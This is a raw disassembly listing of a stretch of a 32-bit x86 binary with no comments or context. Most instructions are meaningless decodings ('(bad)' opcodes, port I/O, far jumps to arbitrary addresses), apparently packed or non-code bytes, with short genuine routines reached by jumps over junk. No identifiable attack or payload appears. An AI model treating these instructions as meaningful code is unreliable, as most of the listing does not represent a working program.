  413987:	les    esp,FWORD PTR [edi+0x37cb6274]
  41398d:	cmc    
  41398e:	jae    0x4139b7
  413990:	jns    0x4139d0
  413992:	lods   eax,DWORD PTR ds:[esi]
  413993:	jg     0x413939
  413995:	pop    es
  413996:	cmp    bh,BYTE PTR [ebp+0x6aa53eb0]
  41399c:	enter  0x208c,0x69
  4139a0:	fcomp  st(3)
  4139a2:	lds    ebp,FWORD PTR [ecx]
  4139a4:	in     eax,0xe5
  4139a6:	xchg   esp,eax
  4139a7:	shr    cl,1
  4139a9:	xchg   BYTE PTR [edi-0x52],bh
  4139ac:	enter  0xe98,0x77
  4139b0:	inc    ebp
  4139b1:	xor    ah,BYTE PTR [edx-0x5ab4b969]
  4139b7:	mov    edx,0x83365ce4
  4139bc:	sbb    ch,BYTE PTR ds:0x69dc8ea3
  4139c2:	push   ds
  4139c3:	sub    BYTE PTR [ebx],bl
  4139c5:	(bad)  
  4139c6:	fnstcw WORD PTR ds:0xbfeb3b22
  4139cc:	jns    0x413a0e
  4139ce:	mov    eax,0x177c81d0
  4139d3:	sbb    eax,0xa88561d
  4139d8:	sub    DWORD PTR [eax+0x252cd048],ebp
  4139de:	(bad)  [ebx+edi*2]
  4139e1:	dec    esi
  4139e2:	std    
  4139e3:	das    
  4139e4:	out    dx,al
  4139e5:	jg     0x4139ae
  4139e7:	inc    esi
  4139e8:	in     eax,0xe6
  4139ea:	ja     0x413999
  4139ec:	ins    BYTE PTR es:[edi],dx
  4139ed:	xchg   bh,dl
  4139ef:	loop   0x413a67
  4139f1:	jg     0x413a63
  4139f3:	nop
  4139f4:	pusha  
  4139f5:	das    
  4139f6:	into   
  4139f7:	test   BYTE PTR [eax+0x4c],cl
  4139fa:	pop    esp
  4139fb:	adc    ch,BYTE PTR [ebp-0x55]
  4139fe:	or     eax,0xb54b3faa
  413a03:	adc    eax,0x67159446
  413a08:	pop    ebx
  413a09:	mov    WORD PTR fs:[ebp+0x46],ds
  413a0d:	fnstcw WORD PTR [edi]
  413a0f:	call   0x1e45:0x48cb2e7
  413a16:	retf   0x57e4
  413a19:	imul   edx,edx,0x31
  413a1c:	adc    BYTE PTR [ebx-0xb32c133],ch
  413a22:	lods   eax,DWORD PTR ds:[esi]
  413a23:	std    
  413a24:	cmp    al,ah
  413a26:	(bad)  
  413a28:	and    DWORD PTR ss:[edx+0x70],ebp
  413a2c:	sub    al,0x6a
  413a2e:	push   eax
  413a2f:	pop    edi
  413a30:	fsub   QWORD PTR [ecx]
  413a32:	test   BYTE PTR ds:0x51016cb3,0xb7
  413a39:	mov    esi,0x96eed686
  413a3e:	and    DWORD PTR [esi],0xffffffc5
  413a41:	mov    edx,0x430a755f
  413a46:	out    dx,eax
  413a47:	xchg   esp,eax
  413a48:	jns    0x4139cc
  413a4a:	sub    bh,BYTE PTR [edi+esi*4+0x59]
  413a4e:	cld    
  413a4f:	mov    BYTE PTR [eax+0x2b1a30d4],0x20
  413a56:	sbb    eax,DWORD PTR [ebx]
  413a58:	clc    
  413a59:	ror    BYTE PTR [edi-0x55],1
  413a5c:	addr16 in eax,0xb3
  413a5f:	adc    eax,0x526de3e4
  413a64:	loopne 0x413a0c
  413a66:	jae    0x4139f2
  413a68:	jno    0x413a0c
  413a6a:	pop    esp
  413a6b:	jl     0x413a9d
  413a6d:	jnp    0x413a16
  413a6f:	inc    edx
  413a70:	xlat   BYTE PTR ds:[ebx]
  413a71:	lock mov ah,0xb
  413a74:	outs   dx,BYTE PTR ds:[esi]
  413a75:	xor    DWORD PTR [ecx-0x6b],ecx
  413a78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a79:	adc    esi,esp
  413a7b:	adc    BYTE PTR [eax],ch
  413a7d:	jp     0x413a6e
  413a7f:	dec    esi
  413a80:	xlat   BYTE PTR ds:[ebx]
  413a81:	scas   eax,DWORD PTR es:[edi]
  413a82:	jno    0x413a2f
  413a84:	fmul   QWORD PTR [ecx-0x442356cc]
  413a8a:	push   ds
  413a8b:	xor    ecx,DWORD PTR [esp+esi*8-0x4e]
  413a8f:	bound  edx,QWORD PTR [edx]
  413a91:	mov    dh,BYTE PTR [eax*2-0x2fe39ce]
  413a98:	cmp    eax,0x7ea66108
  413a9d:	sub    eax,0xda811aa3
  413aa2:	mov    ds:0x4bab590a,eax
  413aa7:	jbe    0x413af6
  413aa9:	test   DWORD PTR [eax+0x1ea031f],ebp
  413aaf:	xor    DWORD PTR [eax-0x39eb4a36],0x32
  413ab6:	fidivr WORD PTR [edx+0x6f]
  413ab9:	clc    
  413aba:	call   0x544191e7
  413abf:	dec    edi
  413ac0:	mov    ch,0x21
  413ac2:	adc    ah,BYTE PTR [ebx-0x15cc392c]
  413ac8:	(bad)  
  413aca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413acb:	shr    DWORD PTR [esp+ebx*2-0x7b],0xb9
  413ad0:	enter  0x8fd7,0x3f
  413ad4:	ins    BYTE PTR es:[edi],dx
  413ad5:	clc    
  413ad6:	xor    BYTE PTR [ecx+0x65],0x4
  413ada:	int3   
  413adb:	ret    0xf752
  413ade:	(bad)  
  413adf:	xor    al,BYTE PTR [esi]
  413ae1:	cmp    ebp,ecx
  413ae3:	sbb    cl,BYTE PTR [edi+0x7d]
  413ae6:	scas   eax,DWORD PTR es:[edi]
  413ae7:	adc    al,0x9e
  413ae9:	adc    bh,BYTE PTR [esi]
  413aeb:	sub    ch,bh
  413aed:	adc    ebp,DWORD PTR [esi+eax*8]
  413af0:	push   ds
  413af1:	xchg   esp,eax
  413af2:	jno    0x413a77
  413af4:	mov    ecx,0x7170ed7a
  413af9:	cld    
  413afa:	xor    DWORD PTR [ebp+0x32],0x69
  413afe:	jo     0x413b2f
  413b00:	retf   0xd790
  413b03:	scas   eax,DWORD PTR es:[edi]
  413b04:	adc    ch,BYTE PTR fs:[ebp+0x2f]
  413b08:	dec    edx
  413b09:	pusha  
  413b0a:	fstp   QWORD PTR [ebx]
  413b0c:	sbb    al,0xc4
  413b0e:	cmp    bl,BYTE PTR [ebx+ebx*4-0x2077d4ec]
  413b15:	or     DWORD PTR [esi-0x63371a91],esi
  413b1b:	jno    0x413b52
  413b1d:	xlat   BYTE PTR ds:[ebx]
  413b1e:	mov    al,0xb4
  413b20:	mov    ds:0x29394ab6,al
  413b25:	sub    DWORD PTR [edi],0xffffffaf
  413b28:	or     BYTE PTR [edi+0x3],0x10
  413b2c:	push   0xf6f37320
  413b31:	js     0x413b62
  413b33:	cwde   
  413b34:	call   0x986aeea6
  413b39:	inc    edi
  413b3a:	jno    0x413ba5
  413b3c:	shl    esp,0xb9
  413b3f:	mov    ecx,0x2d46b1c7
  413b44:	cmp    bh,BYTE PTR [ebx-0x3e5b9462]
  413b4a:	add    BYTE PTR [eax+0x3214815a],bl
  413b50:	mov    eax,0xf4d280d5
  413b55:	cwde   
  413b56:	adc    al,0x2b
  413b58:	xchg   BYTE PTR [ecx+0x7],cl
  413b5b:	jbe    0x413b15
  413b5d:	xchg   eax,ebp
  413b5f:	adc    eax,DWORD PTR [esi-0x47]
  413b62:	mov    DWORD PTR [edx-0x32c0c376],eax
  413b68:	(bad)  
  413b69:	mov    edx,0xf38c15d9
  413b6e:	mov    DWORD PTR [ebx+0x4c],ecx
  413b71:	jbe    0x413bb5
  413b73:	fwait
  413b74:	sti    
  413b75:	nop
  413b76:	jle    0x413b9c
  413b78:	ficomp WORD PTR [edx+0x19]
  413b7b:	scas   al,BYTE PTR es:[edi]
  413b7c:	fnstcw WORD PTR [eax+0x23]
  413b7f:	push   eax
  413b80:	jle    0x413b8b
  413b82:	aam    0x9
  413b84:	popa   
  413b85:	push   ebp
  413b86:	inc    ebx
  413b87:	pop    ds
  413b88:	push   es
  413b89:	push   edx
  413b8a:	popf   
  413b8b:	pop    DWORD PTR [ebx]
  413b8d:	mov    edx,0xe700c0a8
  413b92:	(bad)  
  413b94:	xor    eax,0x594b00fc
  413b99:	bound  ecx,QWORD PTR [ebp+0x3a08405d]
  413b9f:	ins    BYTE PTR es:[edi],dx
  413ba0:	aas    
  413ba1:	fxch   st(1)
  413ba3:	jae    0x413b54
  413ba5:	mov    ebp,0x528102ff
  413baa:	sub    al,0x4b
  413bac:	xchg   esi,eax
  413bad:	cdq    
  413bae:	nop
  413baf:	loop   0x413b45
  413bb1:	adc    DWORD PTR [eax-0x6b],ebx
  413bb4:	ror    DWORD PTR [ebx],1
  413bb6:	call   0x1d25a4b2
  413bbb:	test   BYTE PTR [esi+0x41],dh
  413bbe:	xor    cl,bl
  413bc0:	sbb    eax,0xdae353a
  413bc5:	mov    bl,BYTE PTR ds:0x63e918fa
  413bcb:	jecxz  0x413be5
  413bcd:	pop    ebp
  413bce:	and    bh,BYTE PTR [edi-0x2d]
  413bd1:	cmp    DWORD PTR [eax+edx*4-0x32],0x5be1deb
  413bd9:	xchg   esi,eax
  413bda:	rcr    DWORD PTR [ecx+0x77],cl
  413bdd:	sbb    al,0x9a
  413bdf:	inc    esp
  413be0:	xchg   edx,eax
  413be1:	xchg   esp,eax
  413be2:	sbb    DWORD PTR [ebx],edx
  413be4:	fcomp  DWORD PTR [ecx-0x73]
  413be7:	push   cs
  413be8:	cmc    
  413be9:	shl    DWORD PTR [ebx+0x292615fd],0x4
  413bf0:	test   al,0xa3
  413bf2:	add    BYTE PTR [ebx+ebx*4],dl
  413bf5:	inc    esp
  413bf6:	xchg   ecx,eax
  413bf7:	or     BYTE PTR [ebx+0x591c0ccb],0x50
  413bfe:	enter  0x9035,0xc0
  413c02:	in     al,dx
  413c03:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  413c05:	jle    0x413bf2
  413c07:	nop
  413c08:	adc    al,0x99
  413c0a:	scas   al,BYTE PTR es:[edi]
  413c0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c0c:	sub    esp,DWORD PTR ds:[edx-0x7bf74d7f]
  413c13:	enter  0x25c5,0x42
  413c17:	fwait
  413c18:	retf   0x1ceb
  413c1b:	outs   dx,DWORD PTR ds:[esi]
  413c1c:	pushf  
  413c1d:	sti    
  413c1e:	sahf   
  413c1f:	push   edi
  413c20:	jo     0x413bde
  413c22:	int    0x34
  413c24:	call   0xe326129d
  413c29:	jge    0x413c39
  413c2b:	stos   DWORD PTR es:[edi],eax
  413c2c:	ins    BYTE PTR es:[edi],dx
  413c2d:	adc    ch,cl
  413c2f:	mov    WORD PTR [ebx-0x66ab5],?
  413c35:	sub    ebp,DWORD PTR [eax+edx*8-0x7a]
  413c39:	ja     0x413c05
  413c3b:	je     0x413c4f
  413c3d:	outs   dx,DWORD PTR ds:[esi]
  413c3e:	popa   
  413c3f:	push   0x9a636227
  413c44:	pop    ss
  413c45:	and    DWORD PTR [esi-0x7dcf6e99],esp
  413c4b:	mov    edx,0x2fc6577a
  413c50:	add    al,0xce
  413c52:	cs mov ah,0xa5
  413c55:	xor    dl,bl
  413c57:	enter  0xe9c0,0x7b
  413c5b:	aaa    
  413c5c:	mov    dl,0x7a
  413c5e:	and    al,0x26
  413c60:	fnsave [ebp+0x5149f25d]
  413c66:	mov    esp,0x6d367eb
  413c6b:	or     bh,dh
  413c6d:	sub    eax,0xa6886f22
  413c72:	sub    BYTE PTR [ebp-0x77],dl
  413c75:	or     al,0x1b
  413c77:	adc    eax,0x2c10326f
  413c7c:	mov    DWORD PTR [eax],ebp
  413c7e:	dec    edx
  413c7f:	lods   eax,DWORD PTR cs:[esi]
  413c81:	inc    edi
  413c82:	ss push ebp
  413c84:	(bad)  
  413c85:	or     cl,BYTE PTR [edx+0x60]
  413c88:	add    al,0x2c
  413c8a:	leave  
  413c8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c8c:	repz push edi
  413c8e:	dec    ebx
  413c8f:	cwde   
  413c90:	or     ecx,DWORD PTR [eax-0xf]
  413c93:	add    eax,0x1d40ae56
  413c98:	xchg   ebp,eax
  413c99:	cmp    al,0x1f
  413c9b:	mov    al,0x7e
  413c9d:	xchg   ecx,eax
  413c9e:	call   0xff3e389e
  413ca3:	pusha  
  413ca4:	inc    ecx
  413ca5:	jl     0x413ce4
  413ca7:	neg    edi
  413ca9:	jmp    0x8b513fcc
  413cae:	dec    ebp
  413caf:	fcom   DWORD PTR [ebx]
  413cb1:	pop    eax
  413cb2:	add    al,0x6a
  413cb4:	add    dh,BYTE PTR [ebx]
  413cb6:	fimul  WORD PTR [ebx+0x2b5edc75]
  413cbc:	icebp  
  413cbd:	mov    ecx,DWORD PTR [ebp-0x30]
  413cc0:	sub    esi,ecx
  413cc2:	mov    eax,ebx
  413cc4:	mov    ebx,DWORD PTR [ebp-0x2c]
  413cc7:	mov    ecx,DWORD PTR [ebp+0xc]
  413cca:	add    esi,DWORD PTR [ecx]
  413ccc:	xor    edx,0xca79a577
  413cd2:	shrd   edx,eax,0x2
  413cd6:	xor    ecx,ecx
  413cd8:	shl    esi,0x1e
  413cdb:	xor    ecx,edi
  413cdd:	shr    eax,0x2
  413ce0:	or     ecx,edx
  413ce2:	xor    esi,0x40000000
  413ce8:	or     esi,eax
  413cea:	mov    DWORD PTR [ebp-0x40],ecx
  413ced:	jmp    0x4140c5
  413cf2:	mov    ebx,0xbaf9bbd6
  413cf7:	fcomp  QWORD PTR [edx-0x1ad0e566]
  413cfd:	stos   BYTE PTR es:[edi],al
  413cfe:	push   ecx
  413cff:	jmp    0x413cc4
  413d01:	jl     0x413c8c
  413d03:	xor    bl,BYTE PTR [eax]
  413d05:	sbb    BYTE PTR [edx-0x60e7e7ee],ch
  413d0b:	xchg   edx,eax
  413d0c:	(bad)  
  413d0d:	loopne 0x413cfa
  413d0f:	test   BYTE PTR [eax+0x5a],cl
  413d12:	mov    dl,0x79
  413d14:	add    bh,BYTE PTR [ecx+0x558c2459]
  413d1a:	ja     0x413d86
  413d1c:	xchg   edi,eax
  413d1d:	fstp   QWORD PTR [ecx]
  413d1f:	int3   
  413d20:	(bad)  
  413d21:	aas    
  413d22:	(bad)  
  413d24:	cmp    ecx,DWORD PTR [ebx-0x10]
  413d27:	iret   
  413d28:	mul    DWORD PTR [edx]
  413d2a:	jmp    0x7431:0xd5c8e6dc
  413d31:	call   DWORD PTR [edi]
  413d33:	out    0x4d,al
  413d35:	and    BYTE PTR [ebp+0x6b962bed],ch
  413d3b:	dec    ebx
  413d3c:	stos   DWORD PTR es:[edi],eax
  413d3d:	cdq    
  413d3e:	sbb    al,0x45
  413d40:	fs pop esi
  413d42:	inc    ebp
  413d43:	dec    eax
  413d44:	and    BYTE PTR [eax-0x3b],bh
  413d47:	adc    ecx,edx
  413d49:	sub    ch,bl
  413d4b:	cld    
  413d4c:	jle    0x413d30
  413d4e:	sahf   
  413d4f:	imul   esi,DWORD PTR ds:0x60e6dc99,0xffffffd5
  413d56:	retf   0x48ef
  413d59:	retf   0x42a2
  413d5c:	pop    esp
  413d5d:	xchg   ebx,eax
  413d5e:	xor    al,0xa0
  413d60:	loope  0x413d19
  413d62:	fdivr  QWORD PTR [edi-0xb]
  413d65:	cmp    esi,DWORD PTR [eax-0x6860ba22]
  413d6b:	nop
  413d6c:	mov    eax,0x101a297f
  413d71:	sti    
  413d72:	jns    0x413d7b
  413d74:	or     eax,0x15730542
  413d79:	mov    ch,0xdd
  413d7b:	enter  0xd465,0x1e
  413d7f:	mov    dh,0x22
  413d81:	adc    WORD PTR [ebx-0x3b],bx
  413d85:	inc    esi
  413d86:	mov    ch,0xc1
  413d88:	inc    ebx
  413d89:	push   esp
  413d8a:	sbb    ebp,DWORD PTR [ecx-0x80]
  413d8d:	push   edi
  413d8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d8f:	inc    eax
  413d90:	mov    ds:0x1f50bf52,eax
  413d95:	dec    ebx
  413d96:	dec    edx
  413d97:	adc    DWORD PTR [ebp-0x4c],0xffffffb3
  413d9b:	or     BYTE PTR [esi],bl
  413d9d:	aad    0xee
  413d9f:	mov    eax,0xe1ef114f
  413da4:	push   eax
  413da5:	mov    cl,0x1e
  413da7:	push   cs
  413da8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413da9:	fndisi(8087 only) 
  413dab:	into   
  413dac:	and    BYTE PTR [esi+0x4a824a54],cl
  413db2:	cmp    DWORD PTR [ebp-0x3eb3ccff],esi
  413db8:	xlat   BYTE PTR ds:[ebx]
  413dba:	dec    BYTE PTR [ebp+0x656f7a7c]
  413dc0:	(bad)  
  413dc1:	or     eax,eax
  413dc3:	fcom   QWORD PTR [eax+0x27]
  413dc6:	pushf  
  413dc7:	mov    ds:0xca769ef6,eax
  413dcc:	nop
  413dcd:	cli    
  413dce:	jbe    0x413dff
  413dd0:	ds push esi
  413dd2:	mov    ebx,0xe25dfef1
  413dd7:	mov    bl,0x1f
  413dd9:	sub    al,0x4a
  413ddb:	and    bl,ch
  413ddd:	in     eax,dx
  413dde:	out    0x4,eax
  413de0:	sbb    eax,0x4a508762
  413de5:	test   eax,0x6cfbcec6
  413dea:	int3   
  413deb:	out    0xf1,eax
  413ded:	push   ebx
  413dee:	pop    ebp
  413def:	aaa    
  413df0:	into   
  413df1:	adc    al,0xfe
  413df3:	xor    esp,DWORD PTR [edi+0x7d]
  413df6:	adc    al,BYTE PTR es:[esi+0x6d]
  413dfa:	add    al,0xb1
  413dfc:	jnp    0x413e16
  413dfe:	add    DWORD PTR [esi-0x7d07c44e],ebx
  413e04:	dec    edi
  413e05:	call   0x6c66:0xdd634b1e
  413e0c:	mov    bh,0xad
  413e0e:	dec    edx
  413e0f:	lahf   
  413e10:	das    
  413e11:	mov    edx,0x2a4c2105
  413e16:	fincstp 
  413e18:	icebp  
  413e19:	fadd   QWORD PTR ds:0x90c7434e
  413e1f:	test   BYTE PTR [ebp-0x4a110a40],ch
  413e25:	xchg   edx,eax
  413e26:	retf   0x908f
  413e29:	(bad)  
  413e2a:	retf   
  413e2b:	popf   
  413e2c:	(bad)  
  413e2d:	pop    edx
  413e2e:	pusha  
  413e2f:	jecxz  0x413e5f
  413e31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e32:	pop    ecx
  413e33:	or     BYTE PTR [ebx+ecx*8],al
  413e36:	sbb    eax,0x736da516
  413e3b:	pop    ecx
  413e3c:	push   esi
  413e3d:	ss push 0xf
  413e40:	je     0x413e91
  413e42:	push   esi
  413e43:	pop    eax
  413e44:	sbb    DWORD PTR [edx],eax
  413e46:	imul   ebp,DWORD PTR [edx],0xffffff81
  413e49:	out    dx,eax
  413e4a:	sbb    al,0x6d
  413e4c:	mov    eax,ds:0x57e15622
  413e51:	pop    ebp
  413e52:	(bad)  
  413e53:	not    ecx
  413e55:	adc    edi,esp
  413e57:	mov    bl,0x37
  413e59:	ins    DWORD PTR es:[edi],dx
  413e5a:	add    eax,0x9c384ec6
  413e5f:	inc    eax
  413e60:	fnstenv ds:0x551f112c
  413e66:	mov    esi,0xe3613f0a
  413e6b:	popf   
  413e6c:	cwde   
  413e6d:	pop    ebp
  413e6e:	push   cs
  413e6f:	sti    
  413e70:	mov    DWORD PTR [edi+0x30],edi
  413e73:	mov    edx,0x4458f3f3
  413e78:	popa   
  413e79:	dec    ecx
  413e7a:	mov    esp,0x856702fd
  413e7f:	cmp    ebx,DWORD PTR [ebp+0x44]
  413e82:	imul   esi,DWORD PTR [edx+0x4d],0x4c
  413e86:	jmp    0x8e3c:0xf9c4fe27
  413e8d:	jmp    0x413e99
  413e8f:	push   cs
  413e90:	(bad)  
  413e91:	aad    0xf
  413e93:	mov    edi,0x155e8c69
  413e98:	or     bl,dh
  413e9a:	out    dx,al
  413e9b:	pop    ecx
  413e9c:	or     cl,BYTE PTR [ecx+0x6729659d]
  413ea2:	mov    al,0x5a
  413ea4:	cmp    dl,BYTE PTR [ebx+0x4a]
  413ea7:	sar    BYTE PTR [ebx],0xdf
  413eaa:	mov    ah,0x8
  413eac:	shl    BYTE PTR [ebp+0x45],0xe2
  413eb0:	inc    ecx
  413eb1:	in     eax,dx
  413eb2:	nop
  413eb3:	into   
  413eb4:	adc    BYTE PTR [edx],bh
  413eb6:	popa   
  413eb7:	lods   al,BYTE PTR ds:[esi]
  413eb8:	iret   
  413eb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413eba:	and    BYTE PTR [edi-0x77136ae1],dh
  413ec0:	sbb    BYTE PTR [esp+ebx*4-0x5c],0x1f
  413ec5:	call   0x79c7a75c
  413eca:	ror    DWORD PTR [ebx-0x6401fc03],cl
  413ed0:	jl     0x413ee5
  413ed2:	cli    
  413ed3:	xor    bh,BYTE PTR [esi]
  413ed5:	shr    BYTE PTR [eax+esi*1-0x64],cl
  413ed9:	dec    esp
  413eda:	call   0xa8ffae7c
  413edf:	stos   BYTE PTR es:[edi],al
  413ee0:	stc    
  413ee1:	push   edi
  413ee2:	jle    0x413f09
  413ee4:	repz inc eax
  413ee6:	jp     0x413f43
  413ee8:	mov    dh,0x64
  413eea:	sub    eax,0x167e582c
  413eef:	and    al,0x75
  413ef1:	jmp    0x413efe
  413ef3:	fnstcw WORD PTR [edx+0x7457e262]
  413ef9:	repnz pop esp
  413efb:	hlt    
  413efc:	inc    ebp
  413efd:	(bad)  
  413efe:	fcomip st,st(6)
  413f00:	cmc    
  413f01:	sbb    dl,BYTE PTR [ecx-0x49]
  413f04:	imul   esp,DWORD PTR [eax],0x62
  413f07:	leave  
  413f08:	mov    ds:0xae81c07d,al
  413f0d:	icebp  
  413f0e:	mov    ah,0x8
  413f10:	call   0x31f2c9f8
  413f15:	pop    ebx
  413f16:	jmp    0x18960dc6
  413f1b:	mov    ds:0xcdc2e5b5,al
  413f20:	xchg   ebx,eax
  413f21:	shl    BYTE PTR [ebx-0x7c5393e3],1
  413f27:	jmp    0xda3c0fb
  413f2c:	mov    esi,0xb5f232e6
  413f31:	out    0x46,al
  413f33:	inc    DWORD PTR [ebx]
  413f35:	jmp    0xb89ee627
  413f3a:	dec    esp
  413f3b:	stc    
  413f3c:	sbb    esi,ebx
  413f3e:	jl     0x413fb1
  413f40:	jg     0x413f79
  413f42:	push   ds
  413f43:	add    ch,BYTE PTR [ecx]
  413f45:	and    cl,BYTE PTR [edx+0x1]
  413f48:	mov    edx,esp
  413f4a:	mov    ah,0x2b
  413f4c:	push   cs
  413f4d:	clc    
  413f4e:	icebp  
  413f4f:	cmp    al,0x42
  413f51:	sar    BYTE PTR [ebp+0x69900aa7],cl
  413f57:	sub    eax,0x9a3e75eb
  413f5c:	(bad)  
  413f5e:	lods   al,BYTE PTR ds:[esi]
  413f5f:	(bad)  
  413f60:	jmp    0xc8bb:0x7bab7d3e
  413f67:	iret   
  413f68:	aaa    
  413f69:	sub    BYTE PTR [eax-0x6a],cl
  413f6c:	xor    eax,0x6698377f
  413f71:	imul   edx,ebx,0xaf13b561
  413f77:	mov    DWORD PTR [esi+0x4e373bb4],esi
  413f7d:	aam    0x19
  413f7f:	push   esp
  413f80:	mov    eax,0xe60ec089
  413f85:	mov    edx,0xa3b6c86a
  413f8a:	pop    edx
  413f8b:	and    al,dh
  413f8d:	mov    ds:0xad5e5fc6,eax
  413f92:	idiv   BYTE PTR [ebp-0x3514b2e0]
  413f98:	scas   eax,DWORD PTR es:[edi]
  413f99:	sbb    ebx,edi
  413f9b:	jns    0x413fb0
  413f9d:	sbb    BYTE PTR [esi],dh
  413f9f:	mov    eax,ds:0x66ce90f3
  413fa4:	push   ebp
  413fa5:	jb     0x413f83
  413fa7:	jge    0x413fc9
  413fa9:	sub    dl,BYTE PTR [eax-0x1791b8c0]
  413faf:	out    0xfe,al
  413fb1:	jmp    0x6b9c8aa4
  413fb6:	sti    
  413fb7:	loop   0x413f5b
  413fb9:	loop   0x413f74
  413fbb:	push   edi
  413fbc:	in     al,dx
  413fbd:	test   DWORD PTR [esi],edi
  413fbf:	and    ah,BYTE PTR [ecx-0x34781f6c]
  413fc5:	adc    bl,bl
  413fc7:	jecxz  0x413fed
  413fc9:	jno    0x413fae
  413fcb:	or     BYTE PTR [ecx-0x402e5c2],ch
  413fd1:	fnstenv [ebp+ebp*4-0x289429d8]
  413fd8:	imul   edi,DWORD PTR [edi+0x3d],0xdf99f4a
  413fdf:	xchg   edx,eax
  413fe0:	dec    ebx
  413fe1:	sbb    BYTE PTR ds:0x560ec377,0x91
  413fe8:	dec    ecx
  413fe9:	mov    bh,0xb2
  413feb:	sub    DWORD PTR [ebx+0x5923e610],ebx
  413ff1:	stos   DWORD PTR es:[edi],eax
  413ff2:	mov    esp,0xbed0935c
  413ff7:	cli    
  413ff8:	repnz adc DWORD PTR [eax+0x4e5d287d],esp
  413fff:	(bad)  
  414000:	or     eax,0xa2a7562a
  414005:	ss pop ecx
  414007:	shl    DWORD PTR [edi+0x40],cl
  41400a:	pop    ebx
  41400b:	xchg   ecx,eax
  41400c:	test   eax,0xd7200861
  414011:	data16 xor BYTE PTR es:[ebx-0x2f],bh
  414016:	sbb    eax,0xb311ded8
  41401b:	popf   
  41401c:	aam    0x25
  41401e:	dec    eax
  41401f:	cmp    bl,BYTE PTR [ebx+ebp*1+0x54eb17fe]
  414026:	jle    0x413fe1
  414028:	sub    ebp,DWORD PTR [ecx-0x7b56f6b]
  41402e:	xor    ebx,DWORD PTR [ecx-0x3]
  414031:	xchg   DWORD PTR [esi+0x27],esi
  414034:	pusha  
  414035:	ficom  WORD PTR [edx+ebp*2-0x1e]
  414039:	cmp    DWORD PTR [ecx],0x5cd8fe15
  41403f:	mov    ecx,0x7c6d800a
  414044:	jmp    0x2de0:0x498aa670
  41404b:	mov    ch,0xb8
  41404d:	adc    esp,DWORD PTR [edx-0x477ac2af]
  414053:	cmp    ebp,DWORD PTR [ecx-0x2976c067]
  414059:	mov    bl,0x90
  41405b:	adc    DWORD PTR [edx],edi
  41405d:	xchg   ebx,eax
  41405e:	push   edi
  41405f:	lods   eax,DWORD PTR ds:[esi]
  414060:	shl    DWORD PTR [ecx+0x1b5982f2],0x74
  414067:	jns    0x414002
  414069:	cdq    
  41406a:	jmp    0xa88f7197
  41406f:	fcmovbe st,st(5)
  414071:	call   0xb175:0x5a3d0812
  414078:	cdq    
  414079:	icebp  
  41407a:	xchg   ebp,eax
  41407b:	nop
  41407c:	icebp  
  41407d:	test   BYTE PTR es:[edi+edi*8],bh
  414081:	or     DWORD PTR [eax-0x64],0x1fe4d866
  414088:	(bad)  
  414089:	fbstp  TBYTE PTR [esi-0x4c]
  41408c:	iret   
  41408d:	and    bh,al
  41408f:	xchg   edi,eax
  414090:	test   BYTE PTR [edi+0x1d62c464],dl
  414096:	cmp    BYTE PTR [esi+ebp*2-0x16],dh
  41409a:	jmp    0x5307072f
  41409f:	cmc    
  4140a0:	add    DWORD PTR [ebx],ecx
  4140a2:	push   ds
  4140a3:	xor    ah,BYTE PTR [ebx-0x60de6ee0]
  4140a9:	fiadd  DWORD PTR [ecx]
  4140ab:	xor    DWORD PTR [edx],ebp
  4140ad:	sbb    dh,BYTE PTR [esi-0x377d26bc]
  4140b3:	nop
  4140b4:	lds    ecx,FWORD PTR [ebx+0xa]
  4140b7:	sahf   
  4140b8:	and    BYTE PTR [ebp+0x3f7e2f8],al
  4140be:	xlat   BYTE PTR ds:[ebx]
  4140bf:	pusha  
  4140c0:	xor    BYTE PTR [ebx+0x571ca326],dh
  4140c6:	mov    DWORD PTR [ebp-0x3c],esi
  4140c9:	mov    eax,DWORD PTR [ebp-0x48]
  4140cc:	mov    ecx,DWORD PTR [ebp-0x44]
  4140cf:	push   0xae0404d3
  4140d4:	push   ecx
  4140d5:	push   eax
  4140d6:	call   0x4220ab
  4140db:	mov    ecx,eax
  4140dd:	mov    eax,DWORD PTR [ebp-0x50]
  4140e0:	mov    esi,DWORD PTR [ebp-0x4c]
  4140e3:	or     ecx,eax
  4140e5:	mov    eax,DWORD PTR [ebp-0x40]
  4140e8:	or     edx,esi
  4140ea:	mov    esi,DWORD PTR [ebp-0x3c]
  4140ed:	add    ecx,eax
  4140ef:	mov    eax,DWORD PTR [ebp-0x58]
  4140f2:	adc    edx,esi
  4140f4:	mov    esi,DWORD PTR [ebp-0x54]
  4140f7:	add    ecx,eax
  4140f9:	mov    eax,DWORD PTR [ebp+0x8]
  4140fc:	adc    edx,esi
  4140fe:	add    ecx,0xffff55a8
  414104:	pop    edi
  414105:	adc    edx,0xffff64cd
  41410b:	pop    esi
  41410c:	mov    DWORD PTR [eax],ecx
  41410e:	mov    DWORD PTR [eax+0x4],edx
  414111:	pop    ebx
  414112:	leave  
  414113:	ret    0x8
  414116:	push   ebp
  414117:	mov    ebp,esp
  414119:	sub    esp,0x3c
  41411c:	mov    DWORD PTR [ebp-0x20],0x3510
  414123:	mov    DWORD PTR [ebp-0x1c],0x2104
  41412a:	mov    DWORD PTR [ebp-0x18],0x5d15
  414131:	mov    DWORD PTR [ebp-0x14],0x30cd
  414138:	mov    DWORD PTR [ebp-0x10],0x1709
  41413f:	mov    DWORD PTR [ebp-0xc],0x260b
  414146:	jmp    0x41450b
  41414b:	jnp    0x4140ce
  41414d:	xlat   BYTE PTR ds:[ebx]
  41414e:	dec    edi
  41414f:	sar    DWORD PTR [edi],cl
  414151:	jnp    0x414190
  414153:	add    DWORD PTR [ebx],edx
  414155:	lds    edi,FWORD PTR [ebx+edx*2+0x66]
  414159:	fwait
  41415a:	jo     0x414176
  41415c:	sub    al,0x18
  41415e:	sbb    al,dl
  414160:	adc    bl,BYTE PTR [eax]
  414162:	sbb    bh,dl
  414164:	and    ah,BYTE PTR [esi]
  414166:	xor    BYTE PTR [ecx+0x71],bl
  414169:	jmp    0x41417e
  41416b:	daa    
  41416c:	out    0x7a,eax
  41416e:	aaa    
  41416f:	aaa    
